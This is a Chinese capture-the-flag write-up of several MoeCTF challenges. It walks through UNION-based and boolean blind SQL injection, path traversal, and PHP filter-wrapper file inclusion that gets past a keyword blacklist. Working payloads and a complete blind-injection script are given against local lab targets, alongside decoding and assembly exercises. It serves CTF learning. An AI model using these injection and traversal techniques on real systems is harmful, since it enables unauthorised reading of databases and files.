2026/09/05 08:10:50 [crit] 306#306: *83 connect() to unix:/run/php/php-fpm.sock failed (2: No such file or directory) while connecting to upstream, client: 127.0.0.1, server: blog.moectf, request: "GET / HTTP/1.1", upstream: "fastcgi://unix:/run/php/php-fpm.sock:", host: "127.0.0.1:8080"
2026/09/05 08:10:55 [crit] 306#306: *85 connect() to unix:/run/php/php-fpm.sock failed (2: No such file or directory) while connecting to upstream, client: 127.0.0.1, server: blog.moectf, request: "GET / HTTP/1.1", upstream: "fastcgi://unix:/run/php/php-fpm.sock:", host: "127.0.0.1:8080"
2026/09/05 08:11:00 [crit] 306#306: *87 connect() to unix:/run/php/php-fpm.sock failed (2: No such file or directory) while connecting to upstream, client: 127.0.0.1, server: blog.moectf, request: "GET / HTTP/1.1", upstream: "fastcgi://unix:/run/php/php-fpm.sock:", host: "127.0.0.1:8080"
2026/09/05 08:11:05 [crit] 306#306: *89 connect() to unix:/run/php/php-fpm.sock failed (2: No such file or directory) while connecting to upstream, client: 127.0.0.1, server: blog.moectf, request: "GET / HTTP/1.1", upstream: "fastcgi://unix:/run/php/php-fpm.sock:", host: "127.0.0.1:8080"
2026/09/05 08:11:10 [crit] 306#306: *91 connect() to unix:/run/php/php-fpm.sock failed (2: No such file or directory) while connecting to upstream, client: 127.0.0.1, server: blog.moectf, request: "GET / HTTP/1.1", upstream: "fastcgi://unix:/run/php/php-fpm.sock:", host: "127.0.0.1:8080"
2026/09/05 08:11:15 [crit] 306#306: *93 connect() to unix:/run/php/php-fpm.sock failed (2: No such file or directory) while connecting to upstream, client: 127.0.0.1, server: blog.moectf, request: "GET / HTTP/1.1", upstream: "fastcgi://unix:/run/php/php-fpm.sock:", host: "127.0.0.1:8080"
2026/09/05 08:11:20 [crit] 306#306: *95 connect() to unix:/run/php/php-fpm.sock failed (2: No such file or directory) while connecting to upstream, client: 127.0.0.1, server: blog.moectf, request: "GET / HTTP/1.1", upstream: "fastcgi://unix:/run/php/php-fpm.sock:", host: "127.0.0.1:8080"
2026/09/05 08:11:25 [crit] 308#308: *97 connect() to unix:/run/php/php-fpm.sock failed (2: No such file or directory) while connecting to upstream, client: 127.0.0.1, server: blog.moectf, request: "GET / HTTP/1.1", upstream: "fastcgi://unix:/run/php/php-fpm.sock:", host: "127.0.0.1:8080"
2026/09/05 08:11:30 [crit] 308#308: *99 connect() to unix:/run/php/php-fpm.sock failed (2: No such file or directory) while connecting to upstream, client: 127.0.0.1, server: blog.moectf, request: "GET / HTTP/1.1", upstream: "fastcgi://unix:/run/php/php-fpm.sock:", host: "127.0.0.1:8080"
2026/09/05 08:11:35 [crit] 308#308: *101 connect() to unix:/run/php/php-fpm.sock failed (2: No such file or directory) while connecting to upstream, client: 127.0.0.1, server: blog.moectf, request: "GET / HTTP/1.1", upstream: "fastcgi://unix:/run/php/php-fpm.sock:", host: "127.0.0.1:8080"
2026/09/05 08:11:40 [crit] 308#308: *103 connect() to unix:/run/php/php-fpm.sock failed (2: No such file or directory) while connecting to upstream, client: 127.0.0.1, server: blog.moectf, request: "GET / HTTP/1.1", upstream: "fastcgi://unix:/run/php/php-fpm.sock:", host: "127.0.0.1:8080"
2026/09/05 08:11:45 [crit] 308#308: *105 connect() to unix:/run/php/php-fpm.sock failed (2: No such file or directory) while connecting to upstream, client: 127.0.0.1, server: blog.moectf, request: "GET / HTTP/1.1", upstream: "fastcgi://unix:/run/php/php-fpm.sock:", host: "127.0.0.1:8080"
2026/09/05 08:11:50 [crit] 308#308: *107 connect() to unix:/run/php/php-fpm.sock failed (2: No such file or directory) while connecting to upstream, client: 127.0.0.1, server: blog.moectf, request: "GET / HTTP/1.1", upstream: "fastcgi://unix:/run/php/php-fpm.sock:", host: "127.0.0.1:8080"
2026/09/05 08:11:55 [crit] 308#308: *109 connect() to unix:/run/php/php-fpm.sock failed (2: No such file or directory) while connecting to upstream, client: 127.0.0.1, server: blog.moectf, request: "GET / HTTP/1.1", upstream: "fastcgi://unix:/run/php/php-fpm.sock:", host: "127.0.0.1:8080"
2026/09/05 08:12:00 [crit] 308#308: *111 connect() to unix:/run/php/php-fpm.sock failed (2: No such file or directory) while connecting to upstream, client: 127.0.0.1, server: blog.moectf, request: "GET / HTTP/1.1", upstream: "fastcgi://unix:/run/php/php-fpm.sock:", host: "127.0.0.1:8080"
2026/09/05 08:12:05 [crit] 308#308: *113 connect() to unix:/run/php/php-fpm.sock failed (2: No such file or directory) while connecting to upstream, client: 127.0.0.1, server: blog.moectf, request: "GET / HTTP/1.1", upstream: "fastcgi://unix:/run/php/php-fpm.sock:", host: "127.0.0.1:8080"
2026/09/05 08:12:10 [crit] 308#308: *115 connect() to unix:/run/php/php-fpm.sock failed (2: No such file or directory) while connecting to upstream, client: 127.0.0.1, server: blog.moectf, request: "GET / HTTP/1.1", upstream: "fastcgi://unix:/run/php/php-fpm.sock:", host: "127.0.0.1:8080"
2026/09/05 08:12:15 [crit] 308#308: *117 connect() to unix:/run/php/php-fpm.sock failed (2: No such file or directory) while connecting to upstream, client: 127.0.0.1, server: blog.moectf, request: "GET / HTTP/1.1", upstream: "fastcgi://unix:/run/php/php-fpm.sock:", host: "127.0.0.1:8080"
```
结合直接打开网站报502错误，由此可以得知Nginx 想把 PHP 请求交给 PHP-FPM，但 /run/php/php-fpm.sock 这个"交接窗口"根本不存在。

看看是什么情况，用
```
ls -la /run/php/
systemctl list-units --all --no-pager | grep -i php
```

发现
```
total 16
drwxr-xr-x 1 www-data www-data 4096 Sep  5 08:07 .
drwxr-xr-x 1 root     root     4096 Sep  5 08:14 ..
-rw-r--r-- 1 root     root        3 Sep  5 08:07 php8.4-fpm.pid
srw-rw---- 1 www-data www-data    0 Sep  5 08:07 php8.4-fpm.sock
php8.4-fpm.service	loaded inactive dead	The PHP 8.4 FastCGI Process Manager
phpsessionclean.service	loaded inactive dead	Clean php session files
phpsessionclean.timer	loaded unknown dead	Clean PHP session files every 30 mins
```

说明socket 存在，但名字对不上
Nginx 配置里写的`/run/php/php-fpm.sock`不存在，实际存在的`/run/php/php8.4-fpm.sock` 

一步步修
```
# 1. 确认 php-fpm 进程活着（如果 ps 没输出就先 start）
ps aux | grep [p]hp-fpm
sudo systemctl start php8.4-fpm

# 2. 把 Nginx 配置里的 socket 路径改成真实的那个
sudo sed -i 's|unix:/run/php/php-fpm.sock|unix:/run/php/php8.4-fpm.sock|' /etc/nginx/sites-available/blog

# 3. 检查语法并重载
sudo nginx -t && sudo systemctl reload nginx

# 4. 验证
curl -s 127.0.0.1:8080 | head -30
```

修完以后发现网页可以跑通了，但是点击下一步时提示上传目录无法写入, 请手动将安装目录下的 /usr/uploads 目录的权限设置为可写然后继续升级

说明usr 目录有问题

```
sudo mkdir -p /var/www/html/usr/uploads
sudo chown -R www-data:www-data /var/www/html/usr
sudo chmod -R 755 /var/www/html/usr
```
确保 uploads 目录存在 → 把整个 usr 目录交给 www-data（PHP 的运行用户）→ 给上读写执行权限

之后就按照给的信息建站，完成后得到
![网页图片](/content/posts/images/moectf-2026/Typecho.png)

---

# ez_BASE_revenge

## starwalking 收到了来自CloverDayssss的消息：
## 「CD：告诉你一个小秘密。」
## 然后他就发来了一堆emoji，一个正经字都没有。
## 「星走路：何意味……这家伙又在发什么癫。」

打开 `flag6.txt`，看到
```
👄👱👞👱👑👢🐨👤👍👥👚🐫👛👏🐹👫👙👎👁🐪👜👡👑🐾👚🐩👁👢👚👥👁👟👐👌🐽👈👅🐨👉🐫👚👏👍👣👅👏👑🐬👐👍👟👐👙👣👑👧👅🐽👍👌👄🐪👢👯👄👣👑👄👐🐪👁👣👛👣👟👎👆👌👑👊👛🐼👟👨👌👎👅👃👄🐧🐬👟👌👌👧🐨👑👍👣👫👆🐼👚🐴
```
题目名字叫 `ez_BASE_revenge`，肯定是要用BASE编码，并且是多重编码

emoji 本质上就是 Unicode 字符，每个都有编号

先用最常见的base64，遍历所有可能的偏移量 offset，计算 `字符 = emoji码点 - offset`，如果结果全部落在 Base64 字母表（A-Z a-z 0-9 + / =），就对了

编写脚本
```python
import string
data = open('flag6.txt', encoding='utf-8').read().strip()
cps = [ord(c) for c in data if ord(c) > 0x2000]   

B64 = set(string.ascii_letters + string.digits + '+/=')
for off in range(0x1F300, 0x1F500):                
    s = ''.join(chr(cp - off) for cp in cps)
    if all(ch in B64 for ch in s):                 
        print(hex(off), s)
```

结果：offset = `0x1F3F7` 时，104 个 emoji 全部变成合法 Base64：

```
MzgzZk1mVnc4dXBtbWJ3ejZGc2JkcnJhYUFQN1R4cXVlNXZ5YVhYblZpNFVUM3kxMlZMY3JldlhWOUZSdEhqUWNLM05hUUp1ZVltOEc=
```

base64解码
```
383fMfVw8upmmbwz6FsbdrraaAP7Txque5vyaXXnVi4UT3y12VLcrevXV9FRtHjQcK3NaQJueYm8G
```

得到一串 78 位的字母数字，没有 `+/=`，没有数字 0、没有大写 O、没有大写 I、没有小写 l——这正是Base58的特征
解码
```python
B58 = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
n = 0
for ch in s:
    n = n * 58 + B58.index(ch)
result = n.to_bytes((n.bit_length() + 7) // 8, 'big')
```

得到：

```
NVXWKY3UMZ5UK3JQNIYV6MJVL42TAX3DOU3TGXZSGMZTGMZTGN6Q====
```

全大写 + 数字 2~7 + 结尾 `=` 填充——Base32

解码：`moectf{Em0j1_15_50_cu73_2333333}`

---

# 河湖小盗

## 听说网信院的往年试题非常神秘，都隐藏在了数据库深处，对外只公开一些无关紧要的东西

## 你能绕过防护拿到往年试题吗？

题目网页有一个搜索框，可能是sql注入
尝试`1 OR 1=1`返回五条记录，说明可以用sql注入

用`UNION SELECT NULL, NULL, ...` 逐个试列数，有三列

用 `id=0` 让原查询返回空，页面上就只剩 UNION 出来的数据

```sql
0 UNION SELECT version(),database(),user()
```

回显：`8.0.46` / `past_paper` / `ctf@127.0.0.1`
MySQL 8.0.46
当前库叫 `past_paper`

翻表：

```sql
0 UNION SELECT table_name,table_rows,NULL
FROM information_schema.tables WHERE table_schema='past_paper'
```



| 表名                | 行数 |
| ----------------- | -- |
| `flag_table`      | 1  |
| `past_paper`      | 3  |
| `public_subjects` | 5  |

找到`flag_table`

```sql
0 UNION SELECT `flag`,`id`,NULL FROM `flag_table`
```

回显第一列：

```
moectf{h3re_i5_your_7e$7_pap3r}
```

---

# 古籍翻阅

## 西电自半部电台起家以来，图书馆藏书无数，出题人将flag藏在了诸多藏书之中

## 作为有耐心的你，一定能够逐本翻阅，获得flag的吧（确信）

题目给了所有书籍的目录如`zi/zhuangzi/manuscript`等，但是发现有一条特殊目录`true_file`，这个一定是突破口。
进入网页，查看源码，可以发现
```html
 <a class="scroll-link" href="/read?book=zi/zhuangzi/manuscript">
                    <span class="seal">0001</span>
                    <span class="title">灵枢校本</span>
                    <span class="meta">子部</span>
```
那么用`/read?book=true_file`读目录
得到提示：其实flag藏在了根目录下，去看看根目录吧
那么要用book参数拼接到文件系统路径中读取文件
直接试 `../、%2e%2e、绝对路径 /flag `等都被过滤或解析失败（返回 404）
以 `true_file` 这个合法存在的文件为锚点向上跳，绕过了对参数开头` ../ `的检测：
`book=true_file/../../../flag`

得到
```
moectf{re@d_the_r00t_5utr4_w1th_path_tr4v3r5@l}
```

---

# 七狗免费小说

## php:// 是什么？小刻不知道哦。小刻知道很多很厉害的 CTFer 都会先打开 F12 看看，万一里面有宝物呢？

打开网站源码，拉到最底下发现隐藏`div`，里面有php代码，搞下来
```php
<?php header("Content-Type: text/html; charset=utf-8"); ?>

<html>
<head><title>刻俄伯的小说</title></head>
<body>
    <div style="width: 100%; background: #ffda33;">
        <h2>刻俄柏的小说</h2>
        <a href='?file=chap1.html'>第一章</a>丨<a href='?file=chap2.html'>第二章</a>丨<a href='?file=flag.php'>Flag 章</a>
    </div>

    <div>
        <hr>
        <?php
        $file = $_GET['file'] ?? 'chap1.html';
        if (preg_match('/http|https|env|\.\.|^\/|=\/|index|proc|input|data|convert|string|file/i', $file)) {
            die("咬你哦！");
        }
        if ($file) {
            ob_start();
            include($file);
            $output = ob_get_clean();

            if (@preg_match('//u', $output)) {
                echo $output;                    // 正常文本 → 直接输出
            } else {
                // 小刻不知道什么是二进制流，但是小刻觉得这里的代码古怪
                echo base64_encode($output);     // 二进制 → base64 输出
            }
        } else {
            echo "哒哒哒哒哒！";
        }
        ?>
    </div>

    <div style="display: none;">
        <hr>
        <?php highlight_file(__FILE__); ?>
    </div>
</body>
</html>
```
这里可以看到有个黑名单`/http|https|env|\.\.|^\/|=\/|index|proc|input|data|convert|string|file/i`

被禁的关键词：

| 关键词 | 防的攻击 |
|---|---|
| `http` / `https` | 远程文件包含（RFI） |
| `..` / `^/` | 目录穿越，读 `/etc/passwd` 之类 |
| `env` | `php://filter` 泄露环境变量 |
| `proc` | `/proc/self/environ` 读环境变量 |
| `input` / `data` | `php://input`、`data://` 伪协议 |
| `index` | 防止读 index.php 源码 |
| `convert` | `convert.base64-encode` 过滤器 |
| `string` | `string.rot13` 等过滤器 |
| `file` | `php://filter` 里常见的 `resource=file` |

```php
if (@preg_match('//u', $output)) {
    echo $output;
} else {
    // 小刻不知道什么是二进制流，但是小刻觉得这里的代码古怪
    echo base64_encode($output);
}
```
从这点代码可以看出来`preg_match('//u', $output)` 是在判断 `$output` 是不是合法的 UTF-8 文本，不是合法 UTF-8，自动 base64 编码后输出，那么可以想办法让输出变成二进制
用压缩过滤器 `zlib.deflate`
```
?file=php://filter/read=zlib.deflate/resource=flag.php
```
服务器返回：

```html
<div>
    <hr>
    lZBBTsJgFIT3nKIhbhsMv1QSa9l5D1pbMcFAxJXGRKyItdKqIYqkRiFKASNFEyMprV7mf6+/K65g...
</div>
```
base64 解码 + 解压，拿到 flag

```python
import re, base64, zlib, urllib.request

url = "http://127.0.0.1:57347/?file=php://filter/read=zlib.deflate/resource=flag.php"
raw = urllib.request.urlopen(url).read().decode('utf-8', 'replace')

# 1. 从页面里抠出 base64 那一段
b64 = re.search(r'<hr>\s*([A-Za-z0-9+/=]{20,})\s*</div>', raw, re.S).group(1)

# 2. base64 解码
data = base64.b64decode(b64)

# 3. zlib 解压（-15 表示裸 deflate，不带 zlib 头）
src = zlib.decompress(data, -15).decode('utf-8')

print(src)
```
运行结果：

```php
<?php
$flag = "moectf{f63c567e-fbb8-0634-288d-333fa5326ce3}";
echo "Flag 就在上面，只有聪明的人才能看见<br>剩下的剧情？大概是<s>被小刻吃掉了</s>作者偷懒没放";
// php php php php php php php php php php
// php php php php php php php php php php
?>
```

---

# Assembly

## 什么是汇编语言（Assembly Language）？什么是 add, mov, jne, loop？什么是寄存器？

## 阅读这一段 x86_64 风格的汇编代码，学习各种指令，并找到正确的 flag！

## 源码：
```
; x86-64, Intel syntax
; rdi points to output buffer

start:
    lea     rdi, [buf]

    lea     rsi, [byte_404000]
    mov     ecx, 25

loc_401000:
    mov     al, byte ptr [rsi]
    mov     byte ptr [rdi], al
    inc     rsi
    inc     rdi
    loop    loc_401000

    mov     eax, 0x2a
    add     eax, 0x16
    cmp     eax, 0x40
    jne     loc_401080

    mov     ebx, 0x10
    shl     ebx, 2
    cmp     eax, ebx
    jne     loc_401080

    mov     ecx, 0x39
    sub     ecx, 0x20
    cmp     ecx, 0x18
    jg      loc_401050

    jmp     loc_401080

loc_401050:
    lea     rsi, [byte_404020]
    mov     ecx, 15

loc_401060:
    mov     al, byte ptr [rsi]
    xor     al, 0x42
    mov     byte ptr [rdi], al
    inc     rsi
    inc     rdi
    loop    loc_401060

    jmp     loc_4010b0

loc_401080:
    lea     rsi, [byte_404030]
    mov     ecx, 9

loc_401090:
    mov     al, byte ptr [rsi]
    mov     byte ptr [rdi], al
    inc     rsi
    inc     rdi
    loop    loc_401090

loc_4010b0:
    mov     byte ptr [rdi], 0
    ret


byte_404000:
    db 0x6d, 0x6f, 0x65, 0x63, 0x74, 0x66, 0x7b
    db 0x41, 0x73, 0x73, 0x65, 0x6d, 0x62, 0x31, 0x79
    db 0x5f, 0x4c, 0x34, 0x6e, 0x67, 0x75, 0x61, 0x67, 0x65, 0x5f

byte_404020:
    db 0x73, 0x11, 0x1d, 0x21, 0x2d
    db 0x72, 0x2d, 0x72, 0x0d, 0x2d
    db 0x2d, 0x2e, 0x63, 0x63, 0x3f

byte_404030:
    db 0x63, 0x6f, 0x72, 0x72, 0x65, 0x63, 0x74, 0x21, 0x7d

buf:
    db 64 dup(0)
```

第 1 步：无脑拷贝前 25 字节

```asm
lea  rsi, [byte_404000]
mov  ecx, 25
loc_401000:
    mov al, [rsi]
    mov [rdi], al
    inc rsi
    inc rdi
    loop loc_401000     ; loop = ecx-- ; if ecx != 0 则跳转
```

`loop` 指令自带 `ecx--`，所以 `ecx=25` 就是循环 25 次，把这段字节原样搬进 `buf`：

```
6d 6f 65 63 74 66 7b 41 73 73 65 6d 62 31 79 5f 4c 34 6e 67 75 61 67 65 5f
m  o  e  c  t  f  {  A  s  s  e  m  b  1  y  _  L  4  n  g  u  a  g  e  _
```

第 2 步：三个"假判断"，逐个算一下就知道走哪

```asm
mov eax, 0x2a      ; eax = 42
add eax, 0x16      ; eax = 42 + 22 = 64
cmp eax, 0x40      ; 64 == 64  → jne 不跳转（继续往下）
```

```asm
mov ebx, 0x10      ; ebx = 16
shl ebx, 2         ; ebx = 16 << 2 = 64
cmp eax, ebx       ; 64 == 64  → jne 不跳转（继续往下）
```

```asm
mov ecx, 0x39      ; ecx = 57
sub ecx, 0x20      ; ecx = 57 - 32 = 25
cmp ecx, 0x18      ; 25 > 24
jg  loc_401050     ; 有符号大于 → 跳转成立！走真分支
```

注意：`jg` 是有符号比较，`ja` 才是无符号。这里 25 > 24，两者结果一样，不影响结论。

三步全部落地的结果：跳到 `loc_401050`。

第 3 步：真分支 —— XOR 0x42

```asm
loc_401050:
    lea  rsi, [byte_404020]
    mov  ecx, 15
loc_401060:
    mov  al, [rsi]
    xor  al, 0x42        ; ← 关键：单字节密钥 0x42
    mov  [rdi], al
    inc  rsi
    inc  rdi
    loop loc_401060
    jmp  loc_4010b0      ; 直接收尾，跳过干扰分支
```

对 `byte_404020` 的 15 个字节逐字节异或 `0x42`：

| 原字节 | xor 0x42 | 字符 |
|--------|----------|------|
| 0x73 | 0x31 | `1` |
| 0x11 | 0x53 | `S` |
| 0x1d | 0x5f | `_` |
| 0x21 | 0x63 | `c` |
| 0x2d | 0x6f | `o` |
| 0x72 | 0x30 | `0` |
| 0x2d | 0x6f | `o` |
| 0x72 | 0x30 | `0` |
| 0x0d | 0x4f | `O` |
| 0x2d | 0x6f | `o` |
| 0x2d | 0x6f | `o` |
| 0x2e | 0x6c | `l` |
| 0x63 | 0x21 | `!` |
| 0x63 | 0x21 | `!` |
| 0x3f | 0x7d | `}` |

拼出来：`1S_co0o0Oool!!}`  

得到：
```
moectf{Assemb1y_L4nguage_1S_co0o0Oool!!}
```

---

# 合乎周礼

## 我听说，自古以来，父亲管教儿子，讲的是长幼有序、本分分明；儿子若有过错，父亲理应指出，这是家中应有的礼数。如今我写代码，就像在搭建一座小庭院：

## JavaScript是庭院中的规矩与路数，而“父亲管教儿子”这句老话，拿来比作编程里的继承与约束，倒也有几分道理。父亲要儿子行得正、走得直，代码里的父类也要让子类守好本分、不逾矩。这样看来，我在JavaScript里讲这个道理，难道不也是合情合理的吗？

打开网页看到
```
配置中心
GET  /api/help      查看接口说明
GET  /api/me        查看当前配置
POST /api/profile   提交 JSON 配置
GET  /api/flag      读取审核后的结果
```
那么直接读/api/flag
```
{
  "ok": true,
  "flag": "moectf{0n3_pr070type_chan9e_@|l_06j3c7$_o8ey}"
}
```

---

# 我爱发明

## 让我们来看人工组的表现吧！

前两关很简单就看数据打字，到了第三关要从一千个样本里检测太难了

race（轮次）机制

未带 Cookie 访问 `/archive`、`/invent/<id>` 会返回：
  `本轮验收尚未开始或已经结束，请回到第三关。`
访问 `GET /stage/3` 会下发 Cookie：

  ```
  Set-Cookie: race=<24位随机串>; Path=/; SameSite=Lax; Max-Age=20
  ```

也就是说，每次访问 `/stage/3` 会开启一轮 20 秒的机械组验收窗口；窗口结束后任何带该 Cookie 的请求都返回 403。
窗口内 `data-mechanical-ms` 从 20000 不断倒数，可用来验证存活时长。

档案数据结构：
列表页 `/archive?page=N`
每条档案是一个卡片：
- `data-id`：档案编号
- `data-team`：所属组别（机械组 / 人工组 / 观众组）
- 列表页**不包含**验收状态与片段。

详情页 `/invent/<id>`
`<body>` 上带有结构化属性：
- `data-team="机械组"` 等
- `data-status="通过"` / `data-status="返工"`（返工即未盖章）
- `data-code="XXXXXXX"`：验收片段（**只有「通过」的档案才有**）

第三轮肯定要用到竞速脚本，先对数据进行采样

先定位机械组
直接看 `/archive?page=N` 列表页卡片上的 `data-team` 属性，组别随 id 循环：

| id % 3 | 组别 |
|---|---|
| 0 | 机械组 |
| 1 | 人工组 |
| 2 | 观众组 |

故机械组档案 = 3,6,9,...,288，共 96 份。

先随机抓若干机械组档案（3,6,9,12,18…），发现 6,12,18 为「通过」且带 code，而 3,9 为「返工」，于是假设 `id % 6 == 0` 才通过。
再开两轮 race 分别验证（每轮 20 秒窗口，用 26 并发抓 25 个样本）：

```python
import http.client, re
from concurrent.futures import ThreadPoolExecutor

def race_cookie():
    c = http.client.HTTPConnection('127.0.0.1', 64473, timeout=20)
    try:
        c.request('GET', '/stage/3')
        r = c.getresponse(); r.read()
        return 'race=' + re.search(r'race=([^;]+)', r.getheader('Set-Cookie')).group(1)
    finally:
        c.close()

def probe(cookie, i):
    c = http.client.HTTPConnection('127.0.0.1', 64473, timeout=20)
    try:
        c.request('GET', f'/invent/{i}', headers={'Cookie': cookie})
        r = c.getresponse(); b = r.read().decode('utf-8', 'replace')
        status = re.search(r'data-status="([^"]*)"', b)
        code   = re.search(r'data-code="([^"]*)"', b)
        return i, (status.group(1) if status else '?'), (code.group(1) if code else None)
    finally:
        c.close()

# 验证 A：id % 6 == 3 的机械组（3,9,...,147）应全部「返工」、无 code
cookie = race_cookie()
with ThreadPoolExecutor(max_workers=26) as ex:
    for row in ex.map(lambda i: probe(cookie, i), list(range(3, 151, 6))):
        print('A', row)   # 期望全部 (id, '返工', None)

# 验证 B：id % 6 == 0 的机械组（6,12,...,150）应全部「通过」、带 code
cookie = race_cookie()
with ThreadPoolExecutor(max_workers=26) as ex:
    for row in ex.map(lambda i: probe(cookie, i), list(range(6, 151, 6))):
        print('B', row)   # 期望全部 (id, '通过', <8位随机code>)
```

两轮结果与假设完全吻合 → 通过档案固定为 `id % 6 == 0`（6,12,...,288，共 48 份），且 `data-code` 每轮随机。

那么得到解题脚本
```python
import http.client, re, time, hashlib, json
from concurrent.futures import ThreadPoolExecutor

def conn():
    return http.client.HTTPConnection('127.0.0.1',64473,timeout=20)

def start():
    # 访问 /stage/3 开启一轮 20 秒的机械组验收窗口，拿到 race Cookie
    for _ in range(10):
        try:
            c=conn()
            c.request('GET','/stage/3')
            r=c.getresponse(); r.read()
            sc=r.getheader('Set-Cookie') or ''
            m=re.search(r'race=([^;]+)',sc)
            if m: return 'race='+m.group(1)   # 注意：Cookie 必须带 race= 前缀
        except Exception:
            pass
        finally:
            try: c.close()
            except Exception: pass
        time.sleep(0.3)
    raise SystemExit('cannot start race')

def grab(cookie,i):
    # 抓单个档案详情页，从 data-code 属性提取验收片段
    for _ in range(4):
        try:
            c=conn()
            c.request('GET',f'/invent/{i}',headers={'Cookie':cookie})
            r=c.getresponse(); b=r.read().decode('utf-8','replace')
            c.close()
            if r.status==200:
                m=re.search(r'data-code="([^"]*)"',b)
                if m: return i,m.group(1)
            return i,None
        except Exception:
            time.sleep(0.1)
    return i,None

cookie=start()
t0=time.time()
ids=list(range(6,289,6))          # 盖章通过的机械组档案：6,12,...,288 共 48 份
with ThreadPoolExecutor(max_workers=40) as ex:
    res=dict(ex.map(lambda i:grab(cookie,i),ids))
print('fetched',len([1 for v in res.values() if v]),'/48 in %.1fs'%(time.time()-t0))
missing=[i for i in ids if res.get(i) is None]
if missing:
    print('missing',missing)
else:
    joined='|'.join(res[i] for i in ids)   # 按 id 升序用 | 连接
    ans=hashlib.sha256(joined.encode()).hexdigest()
    print('joined len',len(joined),'sha256',ans)
    c=conn()
    c.request('POST','/api/finalize',body=json.dumps({'answer':ans}),
              headers={'Cookie':cookie,'Content-Type':'application/json'})
    r=c.getresponse(); body=r.read().decode('utf-8','replace')
    print('finalize',r.status,body)
    c.close()
```

运行结果：

```
fetched 48 /48 in 10.2s
joined len 431 sha256 7efd289a392204c28bbd8c23fc96f9b44cf121f95a7fbdf40189fff341a1c3da
finalize 200 {"ok": true, "flag": "moectf{Comput3rs_@r3_m@gn!fic3nt_+00l}"}
```

---

# 江洋大盗

## 学院经历了上次事件，对数据库进行了全面升级

## 现在你还能拿到往年试题吗？

## 附件：
```
BLACKLIST = [
    "union",
    "sleep",
    "benchmark",
    "get_lock",
    "release_lock",
    "extractvalue",
    "updatexml",
    "load_file",
    "outfile",
    "dumpfile",
    " into ",
    "insert",
    "update",
    "delete",
    "drop",
    "alter",
    "create",
    "replace",
    "truncate",
    "handler",
    "procedure",
    "--",
    "/*",
    "*/",
    "#",
    ";",
]
```

可以看到附件是黑名单，那么这题一个是sql注入的黑名单绕过

| 分类 | 黑名单里的词 | 影响 |
| --- | --- | --- |
| 联合查询 | `union` | 拿不到字段列数 → 不能用 UNION 注入 |
| 时间盲注 | `sleep` `benchmark` `get_lock` `release_lock` | 没法用 `if(...,sleep(5),0)` 走时延 |
| 报错注入 | `extractvalue` `updatexml` | 不能用 XPath 报错泄露数据 |
| 文件读写 | `load_file` `outfile` `dumpfile` | 不能读写服务器文件 |
| 写操作 | `insert/update/delete/drop/alter/create/replace/truncate/handler/procedure/ into ` | 禁止任何写库语句 |
| 注释与截断 | `--` `/*` `*/` `#` `;` | 截断注释全废，最后分号也禁了 |

换大小写也没有用

对搜索框输入`1 and 1=1`，返回表格，数字型注入生效

sql注入手法
| 手法 | 是否可用 | 原因 |
| --- | --- | --- |
| UNION 联合查询 | 否 | `union` 拉黑 |
| 报错注入 | 否 | `extractvalue` / `updatexml` 拉黑 |
| 时间盲注 | 否（用得很蹩脚） | `sleep` / `benchmark` / `get_lock` 拉黑 |
| **布尔盲注** | **是** | 只用 `and` + `ascii(substr(...))`，未命中黑名单 |

那么要使用布尔盲注，要先知道结果有几个字符、读到哪一位该停

猜一个字符串 `s = "flag{...}"`，分两步：

1. 猜长度：`char_length(s) > n`，二分。
2. 逐字符猜：`ascii(substr(s, i, 1)) > n`，同样二分。

那么可以得出脚本：
```python
import urllib.request   
import urllib.parse     
URL = "http://127.0.0.1:57267/"

def ok(payload: str) -> bool:
    """发一个请求，判断 SQL 条件是否成立。

    将 payload 作为 id 提交；页面【没有】出现"没有找到匹配记录"
    就说明查到了记录、条件为真，返回 True，否则返回 False。
    """
    # ---------- 构造请求 ----------
    # urlencode 把 {"id": 内容} 编码成表单格式，例如
    # "1 and 1=1" 会变成 "1+and+1%3D1"（空格->'+'，'='->'%3D'），
    # 这是浏览器提交表单的标准编码，后端能正确还原。
    # .encode() 把字符串转成 bytes，因为 Request 的 data 只接受字节。
    data = urllib.parse.urlencode({"id": payload}).encode()

    # ---------- 发送并重试 ----------
    # 目标服务偶尔会直接掐断连接（RemoteDisconnected），
    # 所以最多重试 8 次；全部失败才抛异常。
    for _ in range(8):
        try:
            # data 非空时，urlopen 会自动把请求方法设为 POST；
            # timeout=15 表示 15 秒没响应就放弃这次尝试。
            req = urllib.request.Request(URL, data=data)
            body = urllib.request.urlopen(req, timeout=15).read()
            text = body.decode("utf-8", "replace")  # bytes -> 字符串

            # 核心判据：没出现提示子串 => 有记录 => True
            return "没有找到匹配记录" not in text
        except Exception:
            continue  # 网络异常就进入下一轮重试

    raise RuntimeError(f"request failed for payload: {payload}")


def blind(expr: str) -> str:
    """盲注提取任意 SQL 标量表达式 expr 的字符串结果。

    用法示例：blind("database()") 返回数据库名。
    内部就是"先猜长度、再逐格猜字符"两步二分。
    """
    # ================= 第 1 步：二分猜长度 =================
    # 二分思想：答案在 [lo, hi] 里，每次问中点，把区间砍掉一半。
    # 上界 200 是随便给的"足够大"值，flag / 库名都远小于它。
    lo, hi = 0, 200
    while lo < hi:
        mid = (lo + hi) // 2  # // 是整数除法，得到中点
        # 拼出 "1 and char_length(数据库名)>50" 这样的条件：
        # char_length(s) 返回字符串长度；ok() 为真 => 长度 > mid
        if ok(f"1 and char_length({expr})>{mid}"):
            lo = mid + 1  # 长度一定比 mid 大，收缩下界
        else:
            hi = mid      # 长度不超过 mid，收缩上界
    length = lo  # 区间缩成一个点时，就是长度
    print(f"[*] length({expr}) = {length}")

    # ================= 第 2 步：逐格二分猜字符 =================
    # 每个位置都重复同一套二分，候选范围是可打印 ASCII [31, 127]。
    out = []
    for i in range(1, length + 1):  # 下标 i 从 1 到 length，正好对应 substr
        lo, hi = 31, 127
        while lo < hi:
            mid = (lo + hi) // 2
            # "1 and ascii(substr(字符串, 3, 1))>70"：
            #   substr(s,i,1) 取第 i 个字符，ascii() 把字符转成数字
            if ok(f"1 and ascii(substr({expr},{i},1))>{mid}"):
                lo = mid + 1
            else:
                hi = mid
        out.append(chr(lo))  # chr(n)：ASCII 数字还原成字符
        print(f"    [{i}/{length}] {chr(lo)!r}")  # !r 带引号打印，便于看清空格

    return "".join(out)  # 把字符列表拼回完整字符串


# 直接运行本文件时 __name__ == "__main__"，执行下面的演示代码；
# 被别的脚本 import（from sqli_blind import blind）时不会执行 —— 便于复用。
if __name__ == "__main__":
    # 自检：恒真条件应返回记录、恒假条件应提示没找到，两者都满足才继续
    assert ok("1 and 1=1") and not ok("1 and 1=2")
    print("[+] boolean blind confirmed")

